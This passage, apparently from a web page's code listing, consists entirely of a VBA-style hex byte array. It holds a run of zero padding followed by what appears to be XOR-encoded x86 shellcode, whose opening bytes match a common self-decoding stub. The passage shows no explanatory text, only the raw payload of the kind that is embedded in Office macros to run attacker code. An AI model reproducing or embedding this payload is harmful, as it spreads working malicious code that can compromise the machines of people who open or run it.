amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HBE&amp;H38&amp;HFE&amp;H59&amp;H43&amp;HD9&amp;HC0&amp;HD9&amp;H74&amp;H24&amp;HF4&amp;H58&amp;H29&amp;HC9&amp;H66&amp;HB9&amp;H04&amp;H02&amp;H83&amp;HC0&amp;H04&amp;H31&amp;H70&amp;H11&amp;H03&amp;H70&amp;H29&amp;H1C&amp;HAC&amp;H72&amp;H89&amp;H88&amp;H47&amp;H65&amp;H49&amp;H49&amp;H3C&amp;H7A&amp;H79&amp;H2D&amp;H35&amp;HA4&amp;HC6&amp;HF9&amp;H5B&amp;HAE&amp;HB7&amp;HD8&amp;HB9&amp;H69&amp;HB3&amp;HF8&amp;HB5&amp;HD7&amp;H10&amp;HC8&amp;H87&amp;HBE&amp;H57&amp;HB7&amp;HF4&amp;H3D&amp;HEA&amp;H54&amp;H78&amp;HAC&amp;HBC&amp;HA7&amp;H80&amp;H5C&amp;H04&amp;HD4&amp;H7C&amp;H2F&amp;H4C&amp;H3F&amp;HF6&amp;H46&amp;HA5&amp;H9B&amp;HE9&amp;H63&amp;H8C&amp;H77&amp;H91&amp;H3D&amp;H5B&amp;H28&amp;H72&amp;H19&amp;HED&amp;HFA&amp;H67&amp;HF1&amp;H16&amp;H9C&amp;HBB&amp;H49&amp;H20&amp;H2C&amp;H1B&amp;H8B&amp;HAA&amp;H87&amp;H28&amp;H36&amp;H09&amp;H1B&amp;H58&amp;H1C&amp;H09&amp;H65&amp;H3A&amp;H29&amp;H4C&amp;H6E&amp;H6D&amp;HB8&amp;H84&amp;HCE&amp;H76&amp;H39&amp;HF8&amp;H8A&amp;H1A&amp;HC8&amp;H88&amp;H73&amp;HBE&amp;H9D&amp;H63&amp;H42&amp;H3D&amp;H95&amp;HAB&amp;HF0&amp;H89&amp;H7A&amp;H76&amp;H73&amp;H7C&amp;H94&amp;H7D&amp;H77&amp;H91&amp;H5C&amp;HB9&amp;H65&amp;H2F&amp;H9A&amp;HA8&amp;H69&amp;HEE&amp;HE2&amp;HE7&amp;H69&amp;HBB&amp;H5E&amp;HD9&amp;HE8&amp;H0A&amp;HDF&amp;H68&amp;H4A&amp;HC8&amp;H44&amp;H87&amp;H46&amp;H15&amp;HC4&amp;H63&amp;H69&amp;H73&amp;HC6&amp;H61&amp;HDE&amp;H6C&amp;H85&amp;H7B&amp;HAA&amp;H51&amp;HF1&amp;HA9&amp;HED&amp;H6A&amp;HD5&amp;H16&amp;H62&amp;H8C&amp;HCA&amp;H88&amp;HC5&amp;HD7&amp;HA6&amp;H04&amp;HE0&amp;H60&amp;H6E&amp;HBB&amp;H7B&amp;H93&amp;HC3&amp;H1E&amp;H4F&amp;H83&amp;HF4&amp;H29&amp;H71&amp;HDE&amp;H1A&amp;H60&amp;H5C&amp;HCB&amp;H79&amp;H09&amp;H51&amp;H7E&amp;H96&amp;HDA&amp;HEB&amp;H89&amp;H82&amp;H6A&amp;H60&amp;H21&amp;H77&amp;H9A&amp;H85&amp;H60&amp;HBC&amp;H52&amp;HA1&amp;H1A&amp;HAC&amp;H3A&amp;H02&amp;H2E&amp;H54&amp;H89&amp;H13&amp;HEC&amp;H2A&amp;H44&amp;HAE&amp;H27&amp;HDD&amp;HBA&amp;H2A&amp;H9C&amp;H39&amp;HEE&amp;HD7&amp;H59&amp;HBD&amp;H57&amp;H9A&amp;H71&amp;HDA&amp;H4E&amp;HB4&amp;HC7&amp;HF6&amp;HD9&amp;HB5&amp;HFD&amp;HC7&amp;H9F&amp;H44&amp;HAB&amp;H77&amp;H92&amp;H21&amp;HA9&amp;HD7&amp;HD7&amp;H83&amp;H3B&amp;H61&amp;H01&amp;H98&amp;HB4&amp;HE7&amp;HB0&amp;H40&amp;HCF&amp;H1B&amp;HBD&amp;H94&amp;H15&amp;HF6&amp;H33&amp;H91&amp;HA7&amp;H7B&amp;HCF&amp;H4B&amp;H04&amp;H5C&amp;H53&amp;HC8&amp;H4C&amp;H42&amp;H80&amp;H18&amp;H99&amp;H51&amp;HCD&amp;HAF&amp;H28&amp;H69&amp;HE9&amp;HBF&amp;H99&amp;H4F&amp;H21&amp;HCA&amp;HE3&amp;H00&amp;H25&amp;H2E&amp;H1A&amp;H14&amp;HD1&amp;H5A&amp;H4A&amp;H89&amp;H4D&amp;H3E&amp;H7A&amp;H8E&amp;HAA&amp;H86&amp;HCA&amp;HE6&amp;H40&amp;HEB&amp;H0E&amp;H9F&amp;H84&amp;HCD&amp;HE2&amp;H52&amp;H06&amp;HE0&amp;H45&amp;HCF&amp;H8B&amp;H17&amp;H0F&amp;H6A&amp;H02&amp;HFD&amp;HF9&amp;H89&amp;H1D&amp;H16&amp;HA1&amp;H3C&amp;H64&amp;H68&amp;H8A&amp;HA3&amp;HC7&amp;HE2&amp;HDC&amp;H2F&amp;H76&amp;H7F&amp;H5E&amp;H6A&amp;HC1&amp;H7C&amp;H22&amp;H52&amp;H69&amp;H7D&amp;HEC&amp;H75&amp;H4D&amp;H7C&amp;H8E&amp;HB7&amp;HBA&amp;H07&amp;H63&amp;H7D&amp;HBC&amp;H84&amp;H7C&amp;HDF&amp;HC5&amp;H09&amp;HA4&amp;HCB&amp;HF3&amp;H58&amp;HB4&amp;H51&amp;HF2&amp;HF3&amp;HEC&amp;H28&amp;H38&amp;HDE&amp;HE3&amp;H06&amp;H7E&amp;H9E&amp;HB5&amp;HDB&amp;HC8&amp;H58&amp;HB5&amp;HF6&amp;H8E&amp;H3B&amp;HA0&amp;H98&amp;H1F&amp;HD8&amp;H88&amp;HC2&amp;H1E&amp;HA7&amp;HC3&amp;H4F&amp;HB4&amp;H9F&amp;H54&amp;H2A&amp;H96&amp;H10&amp;HF3&amp;HC1&amp;HF5&amp;H55&amp;H39&amp;H6F&amp;H9A&amp;HC7&amp;HAC&amp;HCD&amp;HDC&amp;H03&amp;H6D&amp;H6C&amp;HBD&amp;H79&amp;HFF&amp;H23&amp;H93&amp;H28&amp;HAC&amp;HE4&amp;HC1&amp;H93&amp;H07&amp;HFF&amp;HFE&amp;H0B&amp;H80&amp;HE9&amp;H33&amp;H32&amp;HC5&amp;H80&amp;H86&amp;H03&amp;H3E&amp;HE6&amp;HCF&amp;H36&amp;HC4&amp;H93&amp;HF3&amp;H11&amp;HEB&amp;HD9&amp;HE1&amp;H19&amp;H61&amp;H51&amp;H05&amp;H2B&amp;H57&amp;H0C&amp;H7D&amp;H66&amp;HDC&amp;H4B&amp;H97&amp;H8D&amp;H78&amp;H1D&amp;H68&amp;H6C&amp;H4F&amp;HF2&amp;HED&amp;H5D&amp;HCA&amp;H39&amp;HAD&amp;HDE&amp;H7D&amp;HAD&amp;HED&amp;H9F&amp;H9F&amp;H9F&amp;HD6&amp;H4F&amp;H76&amp;H91&amp;H08&amp;H2F&amp;H35&amp;HCB&amp;H6A&amp;H3C&amp;HCE&amp;H50&amp;H73&amp;H80&amp;HD1&amp;H45&amp;HC9&amp;H8A&amp;H4C&amp;H51&amp;H25&amp;HD0&amp;H30&amp;HCE&amp;H00&amp;HB6&amp;H9A&amp;H51&amp;H91&amp;H5E&amp;H2C&amp;H13&amp;H3C&amp;H94&amp;H6B&amp;H3B&amp;H27&amp;HCE&amp;HDE&amp;HBA&amp;HC3&amp;HF0&amp;HC8&amp;H34&amp;H42&amp;HDD&amp;HF4&amp;H32&amp;HCD&amp;H48&amp;HEB&amp;H35&amp;HEF&amp;HEA&amp;HDE&amp;H4A&amp;H96&amp;H95&amp;H8E&amp;H59&amp;H43&amp;H1C&amp;H72&amp;HD7&amp;H33&amp;H5F&amp;H4D&amp;HCC&amp;H24&amp;H81&amp;H49&amp;H1F&amp;HA8&amp;H5D&amp;HFF&amp;H92&amp;H6A&amp;HF1&amp;H54&amp;H98&amp;HC2&amp;H46&amp;H9E&amp;H0A&amp;HC2&amp;HB3&amp;H20&amp;HC8&amp;H47&amp;H82&amp;HD9&amp;HBD&amp;HD5&amp;HDE&amp;H5F&amp;H10&amp;HE9&amp;HF4&amp;HCA&amp;H68&amp;H71&amp;H31&amp;H84&amp;H61&amp;H4C&amp;HB6&amp;H05&amp;HF1&amp;H08&amp;H40&amp;H37&amp;H09&amp;HD7&amp;H5A&amp;H8B&amp;HAB&amp;H42&amp;H22&amp;HAD&amp;H97&amp;HD6&amp;H61&amp;H45&amp;H75&amp;HDD&amp;HCD&amp;HCB&amp;H1D&amp;HE7&amp;H29&amp;HC7&amp;H41&amp;H4C&amp;HEC&amp;H2E&amp;HAD&amp;HD4&amp;H05&amp;HA3&amp;HB9&amp;HE1&amp;H66&amp;H54&amp;H71&amp;HCD&amp;H4E&amp;H75&amp;HEB&amp;H2C&amp;HCF&amp;H58&amp;HF1&amp;H83&amp;H44&amp;HF6&amp;HBF&amp;HD4&amp;H82&amp;H4E&amp;HD6&amp;H0E&amp;H7B&amp;H39&amp;H72&amp;HF1&amp;H95&amp;HE1&amp;HA3&amp;H89&amp;H16&amp;H42&amp;H6D&amp;HF5&amp;H52&amp;H3D&amp;H6F&amp;H41&amp;HEF&amp;H53&amp;H27&amp;HAD&amp;HED&amp;H23&amp;H01&amp;H90&amp;HB1&amp;H2C&amp;HC6&amp;HD3&amp;H30&amp;HEA&amp;H4B&amp;HD8&amp;HC0&amp;HBA&amp;H15&amp;HAF&amp;HE2&amp;H6A&amp;HB7&amp;HD2&amp;H27&amp;H2C&amp;H7B&amp;H7F&amp;HA1&amp;H0A&amp;HB9&amp;HAA&amp;HC8&amp;H0C&amp;H7A&amp;HAA&amp;HB8&amp;HD9&amp;HA1&amp;H6C&amp;H9D&amp;H34&amp;H0B&amp;H3D&amp;H5A&amp;HE2&amp;HC7&amp;H3C&amp;H2F&amp;H33&amp;HEC&amp;H03&amp;HD1&amp;HDF&amp;HB8&amp;HD8&amp;HE8&amp;H0A&amp;H79&amp;H3C&amp;H34&amp;HD9&amp;H31&amp;HF8&amp;H59&amp;HC2&amp;H8D&amp;H1E&amp;HFE&amp;H2C&amp;H55&amp;HE8&amp;H5D&amp;H47&amp;H2E&amp;HC1&amp;H9D&amp;H1D&amp;HE6&amp;H4D&amp;HFB&amp;H60&amp;HBF&amp;HC7&amp;H05&amp;H9B&amp;H8D&amp;HAA&amp;H68&amp;H68&amp;HC6&amp;HB4&amp;H4D&amp;H63&amp;HD0&amp;H9F&amp;H82&amp;H02&amp;HA0&amp;H8F&amp;H12&amp;HFB&amp;H6A&amp;HD4&amp;H8B&amp;H25&amp;H10&amp;H6B&amp;H9C&amp;H63&amp;HB6&amp;HE0&amp;HDE&amp;HF1&amp;HF6&amp;H9A&amp;H70&amp;H4C&amp;H13&amp;HF9&amp;HA4&amp;HD5&amp;HB0&amp;HFB&amp;HB3&amp;H14&amp;H61&amp;H67&amp;H3D&amp;H9E&amp;HE6&amp;HA4&amp;HD2&amp;H51&amp;H61&amp;HD1&amp;H91&amp;H5A&amp;H64&amp;H7F&amp;H64&amp;H7D&amp;H3A&amp;HF6&amp;H17&amp;HE4&amp;HC3&amp;HF2&amp;HBE&amp;H77&amp;H80&amp;H57&amp;HE9&amp;H92&amp;H8C&amp;H98&amp;H08&amp;HBB&amp;H2D&amp;HFD&amp;HE5&amp;H4B&amp;H15&amp;HB8&amp;H1D&amp;H77&amp;H9F&amp;H13&amp;H74&amp;H11&amp;H42&amp;H35&amp;H9A&amp;H39&amp;H3D&amp;H07&amp;H3C&amp;H9E&amp;HFF&amp;H87&amp;H2E&amp;H76&amp;H75&amp;HA2&amp;H6D&amp;HEA&amp;H56&amp;H1B&amp;H32&amp;HF1&amp;HA6&amp;HD3&amp;HFE&amp;H20&amp;HBB&amp;H00&amp;H47&amp;H3D&amp;H87&amp;H1A&amp;H2F&amp;H43&amp;HDB&amp;H0A&amp;HD8&amp;H55&amp;HFF&amp;H84&amp;H14&amp;H40&amp;H37&amp;H84&amp;H94&amp;H68&amp;H4F&amp;H95&amp;H84&amp;H78&amp;H59&amp;H08&amp;HB2&amp;HF3&amp;H5E&amp;HC1&amp;HDF&amp;HB6&amp;H39&amp;HA5&amp;HAF&amp;H6B&amp;HCF&amp;HFA&amp;H71&amp;H30&amp;HAA&amp;H98&amp;HB6&amp;H22&amp;H21&amp;HB6&amp;H93&amp;H9E&amp;H82&amp;H24&amp;H03&amp;H9F&amp;H07&amp;HD8&amp;HEC&amp;H5B&amp;HCD&amp;HA7&amp;H79&amp;H87&amp;H14&amp;H48&amp;H32&amp;H04&amp;H3F&amp;HE4&amp;HEB&amp;H9C&amp;HA0&amp;H07&amp;H13&amp;H83&amp;HD7&amp;HDF&amp;HD8&amp;H86&amp;HEA&amp;HD8&amp;H1C&amp;H56&amp;H30&amp;H50&amp;HC7&amp;HC9&amp;H95&amp;H61&amp;HEA&amp;HF5&amp;HD7&amp;H0D&amp;H22&amp;HB0&amp;H7D&amp;HCA&amp;HC4&amp;H5A</span><br><span class="line">&amp;H66&amp;H37&amp;HEF&amp;H1F&amp;H35&amp;HA2&amp;H62&amp;HC1&amp;HC6&amp;H8E&amp;HA7&amp;HEA&amp;HEA&amp;H18&amp;H68&amp;H2C&amp;HCE&amp;H91&amp;HA9&amp;H55&amp;H55&amp;H2F&amp;H2D&amp;H02&amp;H5C&amp;HBB&amp;HDF&amp;HE2&amp;H39&amp;HD0&amp;H77&amp;H4D&amp;H44&amp;H4B&amp;H5C&amp;H1A&amp;H49&amp;HA6&amp;H24&amp;H55&amp;H99&amp;H09&amp;HBF&amp;HE4&amp;H79&amp;HD9&amp;HF5&amp;HF6&amp;H61&amp;HBC&amp;H17&amp;H09&amp;H85&amp;HE9&amp;HF8&amp;H16&amp;H2A&amp;H09&amp;HCC&amp;H0D&amp;H05&amp;H58&amp;HD1&amp;HD6&amp;HC4&amp;H56&amp;HD5&amp;H63&amp;H49&amp;HAB&amp;HAC&amp;HD6&amp;H5D&amp;HCA&amp;HFD&amp;H80&amp;HB9&amp;H46&amp;HF8&amp;H5C&amp;H69&amp;HDA&amp;H30&amp;HD8&amp;H79&amp;H35&amp;HB5&amp;HC4&amp;H32&amp;HAF&amp;H10&amp;H65&amp;HB5&amp;HBB&amp;H3C&amp;H33&amp;H70&amp;H1A&amp;H4B&amp;H1A&amp;HE2&amp;H04&amp;H33&amp;HFD&amp;H4C&amp;H72&amp;H41&amp;HE8&amp;HC8&amp;HEE&amp;H66&amp;HB0&amp;H82&amp;H2F&amp;H6F&amp;H62&amp;HF6&amp;HBC&amp;H51&amp;HD5&amp;HE3&amp;H83&amp;H8F&amp;H56&amp;H26&amp;H80&amp;H70&amp;H20&amp;HB3&amp;HFB&amp;H60&amp;H4C&amp;H7C&amp;H86&amp;H1B&amp;H66&amp;H7C&amp;HC4&amp;H84&amp;HA6&amp;H44&amp;HDA&amp;HCD&amp;HAB&amp;HFD&amp;HA6&amp;H11&amp;H9C&amp;HCB&amp;H1E&amp;H5A&amp;H37&amp;H1A&amp;HAC&amp;H94&amp;H9C&amp;H16&amp;H09&amp;H87&amp;HBA&amp;H66&amp;H80&amp;H5A&amp;HE6&amp;HFC&amp;H89&amp;H9D&amp;H84&amp;H33&amp;H58&amp;H67&amp;HBB&amp;H05&amp;H04&amp;HC5&amp;H9C&amp;H99&amp;H51&amp;H92&amp;HB7&amp;HDE&amp;H07&amp;H51&amp;H4F&amp;HE8&amp;HCA&amp;H7D&amp;H61&amp;H44&amp;H69&amp;HA5&amp;HA0&amp;HEB&amp;H42&amp;H22&amp;H8A&amp;H68&amp;H4B&amp;H3A&amp;HC5&amp;H62&amp;H72&amp;H0E&amp;H4A&amp;H55&amp;HFF&amp;HE5&amp;HEF&amp;H2A&amp;H03&amp;H5F&amp;HBC&amp;HD8&amp;H5C&amp;H25&amp;H74&amp;HC1&amp;H3A&amp;HE5&amp;HBC&amp;HC8&amp;H07&amp;H73&amp;HF4&amp;H94&amp;H86&amp;H7C&amp;HA1&amp;H1D&amp;HE9&amp;HA2&amp;HE4&amp;H87&amp;H45&amp;H4A&amp;HCD&amp;HA1&amp;H41&amp;H81&amp;H1A&amp;H60&amp;H21&amp;H0E&amp;HC1&amp;H98&amp;H7E&amp;H16&amp;H88&amp;H53&amp;H87&amp;HC4&amp;H39&amp;HB9&amp;H17&amp;H8D&amp;H8C&amp;H95&amp;HDF&amp;H92&amp;H85&amp;HAC&amp;H07&amp;H9C&amp;H24&amp;H53&amp;H2D&amp;H69&amp;H26&amp;HCD&amp;HB4&amp;HE0&amp;H8F&amp;HE8&amp;H4A&amp;H7F&amp;H56&amp;HFC&amp;H0A&amp;H19&amp;H30&amp;HC5&amp;HB5&amp;H26&amp;HDE&amp;HF9&amp;HCE&amp;H18&amp;H3F&amp;H20&amp;HC1&amp;H5B&amp;H02&amp;H6B&amp;H67&amp;H61&amp;HD4&amp;H5C&amp;H8E&amp;HC4&amp;HD0&amp;H86&amp;HCD&amp;HBB&amp;H5E&amp;H3C&amp;HF6&amp;H79&amp;HA3&amp;HEA&amp;H1C&amp;H3E&amp;HCB&amp;HBA&amp;H59&amp;H72&amp;HC2&amp;H42&amp;H1A&amp;H01&amp;HFF&amp;H69&amp;H7F&amp;HB7&amp;H00&amp;H11&amp;H6A&amp;H50&amp;H8E&amp;H1C&amp;H56&amp;H8D&amp;H05&amp;H6E&amp;H67&amp;HAF&amp;H16&amp;H8B&amp;H81&amp;H11&amp;H29&amp;HD8&amp;HF0&amp;H71&amp;H74&amp;HE4&amp;HC2&amp;HB0&amp;H3A&amp;HC8&amp;H9F&amp;H44&amp;H1F&amp;H49&amp;HCA&amp;HFB&amp;H9A&amp;H50&amp;H40&amp;HFE&amp;HCA&amp;H7C&amp;H05&amp;HB0&amp;H03&amp;HC1&amp;H6D&amp;H1B&amp;HA4&amp;H9F&amp;H5F&amp;HC1&amp;H52&amp;H44&amp;H55&amp;H37&amp;HCC&amp;H41&amp;H68&amp;H80&amp;HC7&amp;H01&amp;H8D&amp;HBC&amp;H9E&amp;H16&amp;H5B&amp;H2A&amp;HFF&amp;H4D&amp;HD3&amp;H69&amp;H6B&amp;HE8&amp;HA9&amp;H12&amp;HD9&amp;H9D&amp;H56&amp;H9F&amp;H5C&amp;H70&amp;HBE&amp;H95&amp;H56&amp;HD9&amp;H1E&amp;H7D&amp;HA2&amp;HC3&amp;HF0&amp;H99&amp;H48&amp;HDB&amp;H74&amp;HA7&amp;H59&amp;HF8&amp;H8C&amp;H46&amp;H1C&amp;HA3&amp;HC8&amp;HBD&amp;H9B&amp;H08&amp;HF3&amp;HE7&amp;HCC&amp;H51&amp;HE2&amp;H5E&amp;H83&amp;H20&amp;HB4&amp;H9B&amp;H43&amp;HB9&amp;H5E&amp;H60&amp;H6B&amp;H22&amp;H98&amp;HA9&amp;H3C&amp;H2B&amp;HBD&amp;HC2&amp;H56&amp;H7F&amp;H2F&amp;H9C&amp;H97&amp;H3F&amp;H36&amp;HEB&amp;H90&amp;HEA&amp;H66&amp;H67&amp;H70&amp;HC5&amp;HA1&amp;H40&amp;H0B&amp;H9A&amp;HBB&amp;H38&amp;HE5&amp;H06&amp;HCA&amp;HC6&amp;H9F&amp;HE7&amp;HC0&amp;H29&amp;H73&amp;H82&amp;H74&amp;HD2&amp;HDD&amp;H95&amp;HED&amp;HDA&amp;H79&amp;H3E&amp;H6A&amp;H6E&amp;H84&amp;H82&amp;H04&amp;HDD&amp;H75&amp;H77&amp;HFB&amp;H72&amp;HA5&amp;HCC&amp;HFB&amp;H17&amp;H2F&amp;H12&amp;H5D&amp;H73&amp;H0D&amp;H1C&amp;HC6&amp;H65&amp;HEC&amp;HDA&amp;HB4&amp;H83&amp;HC9&amp;H5A&amp;H9F&amp;H61&amp;HA5&amp;HE4&amp;HC9&amp;H99&amp;HE1&amp;H45&amp;H71&amp;H93&amp;H72&amp;H1B&amp;H56&amp;HCD&amp;H12&amp;H7B&amp;H89&amp;HD3&amp;H25&amp;H36&amp;H69&amp;HA8&amp;H07&amp;H9A&amp;HF5&amp;H11&amp;HFC&amp;HC6&amp;HAB&amp;H41&amp;H06&amp;H1C&amp;H22&amp;HB6&amp;H32&amp;HD9&amp;H8E&amp;H05&amp;H79&amp;H80&amp;H08&amp;H8C&amp;HA9&amp;H12&amp;H50&amp;H92&amp;HD0&amp;HC2&amp;H2F&amp;H47&amp;HF7&amp;HDB&amp;H1A&amp;HC9&amp;H45&amp;H3A&amp;HE0&amp;H86&amp;H3E&amp;H6F&amp;H04&amp;HAE&amp;HE3&amp;H67&amp;H0A&amp;HDC&amp;HDF&amp;H85&amp;HF9&amp;H7E&amp;HB7&amp;H80&amp;H11&amp;H0F&amp;HE6&amp;H5E&amp;HBD&amp;H47&amp;HDE&amp;H0E&amp;H49&amp;H51&amp;HAE&amp;H64&amp;H88&amp;H01&amp;H99&amp;HF0&amp;H07&amp;HD7&amp;H2D&amp;H5A&amp;HD4&amp;HB9&amp;HAE&amp;H11&amp;H11&amp;H18&amp;HC2&amp;HD7&amp;H46&amp;HA1&amp;H27&amp;H3E&amp;H6E&amp;H71&amp;HB4&amp;HCA&amp;H05&amp;HBD&amp;H4E&amp;HF9&amp;HC9&amp;H95&amp;HEB&amp;H91&amp;H48&amp;H09&amp;H27&amp;H45&amp;H19&amp;H74&amp;H00&amp;H42&amp;H3B&amp;HE6&amp;H8E&amp;HD5&amp;H05&amp;H14&amp;HCE&amp;H9B&amp;H5A&amp;HCE&amp;H34&amp;H2C&amp;H99&amp;HA3&amp;H49&amp;HE1&amp;HEC&amp;HB1&amp;H56&amp;H06&amp;H4E&amp;H0C&amp;H9F&amp;HC2&amp;H0B&amp;H90&amp;H8D&amp;H2C&amp;H41&amp;HAD&amp;H11&amp;HA7&amp;H31&amp;H84&amp;HB0&amp;HCA&amp;H98&amp;HFC&amp;H0E&amp;HAE&amp;HBC&amp;HF0&amp;HFB&amp;H6C&amp;H93&amp;HF7&amp;H86&amp;H2C&amp;H3A&amp;H01&amp;H2F&amp;H9A&amp;HD7&amp;H96&amp;HD3&amp;H71&amp;H9A&amp;HB7&amp;H12&amp;HDE&amp;HA6&amp;H9B&amp;HB6&amp;HAA&amp;HFF&amp;HE3&amp;H1F&amp;H74&amp;H4F&amp;H9C&amp;H12&amp;HB7&amp;H59&amp;HC6&amp;HB5&amp;HD3&amp;H5B&amp;HD4&amp;H13&amp;HF5&amp;HEF&amp;H66&amp;H72&amp;H3C&amp;H95&amp;HB1&amp;H38&amp;H1E&amp;H6D&amp;HC0&amp;H4B&amp;H65&amp;H76&amp;HEE&amp;H5C&amp;HAB&amp;HF5&amp;H89&amp;HEF&amp;HA7&amp;HE7&amp;H26&amp;HF6&amp;H89&amp;HD2&amp;H20&amp;HE5&amp;H0A&amp;H3F&amp;HF1&amp;H16&amp;H36&amp;H9A&amp;H59&amp;H09&amp;HA5&amp;HF4&amp;HA3&amp;H52&amp;H45&amp;H52&amp;H47&amp;HF1&amp;HF7&amp;H68&amp;H5D&amp;HA1&amp;HB2&amp;H30&amp;HB8&amp;H39&amp;H6F&amp;H93&amp;H17&amp;H83&amp;H5B&amp;HB3&amp;H0D&amp;H91&amp;HAA&amp;HC4&amp;HD9&amp;H08&amp;H1E&amp;H3C&amp;H22&amp;HA6&amp;H37&amp;HA2&amp;H48&amp;HF9&amp;H9E&amp;H01&amp;H67&amp;H13&amp;H23&amp;H2D&amp;H82&amp;H7F&amp;H5B&amp;H92&amp;H92&amp;H49&amp;H23&amp;H8C&amp;H7B&amp;H24&amp;H10&amp;H2D&amp;H90&amp;H32&amp;H82&amp;H00&amp;H83&amp;H09&amp;H6D&amp;H50&amp;HAC&amp;HF3&amp;H1C&amp;H43&amp;H73&amp;HD2&amp;H73&amp;HA2&amp;H52&amp;H6D&amp;H64&amp;HB4&amp;H00&amp;HF2&amp;H2E&amp;H59&amp;H3D&amp;HA9&amp;H46&amp;H4E&amp;H59&amp;H2C&amp;H9A&amp;H03&amp;H2E&amp;H11&amp;H57&amp;H4F&amp;H7F&amp;HE4&amp;H79&amp;HF1&amp;H57&amp;H12&amp;HC9&amp;H37&amp;H85&amp;H02&amp;H47&amp;H8F&amp;H49&amp;H19&amp;H7A&amp;H75&amp;H33&amp;H65&amp;H4D&amp;H21&amp;HF2&amp;H26&amp;H6A&amp;H3A&amp;HCA&amp;HBA&amp;H8D&amp;H7D&amp;HFA&amp;H55&amp;H20&amp;H66&amp;H7B&amp;HF5&amp;H4F&amp;H75&amp;H3A&amp;HF4&amp;H8A&amp;H40&amp;H7D&amp;H3B&amp;HE0&amp;H6A&amp;H06&amp;HF8&amp;HA3&amp;HAD&amp;H1A&amp;H57&amp;H05&amp;H77&amp;H06&amp;HF3&amp;H3A&amp;HCE&amp;HB9&amp;H44&amp;H8C&amp;H22&amp;HE6&amp;H62&amp;H93&amp;H60&amp;HAC&amp;H09&amp;HE7&amp;H11&amp;H7B&amp;H7E&amp;H41&amp;H28&amp;H2B&amp;H49&amp;H21&amp;H8A&amp;HB3&amp;H03&amp;HAA&amp;H7C&amp;H9B&amp;H12&amp;H35&amp;HDE&amp;H29&amp;HCA&amp;H2F&amp;H96&amp;H56&amp;H08&amp;HAA&amp;HE1&amp;H20&amp;H5C&amp;H18&amp;H05&amp;H13&amp;H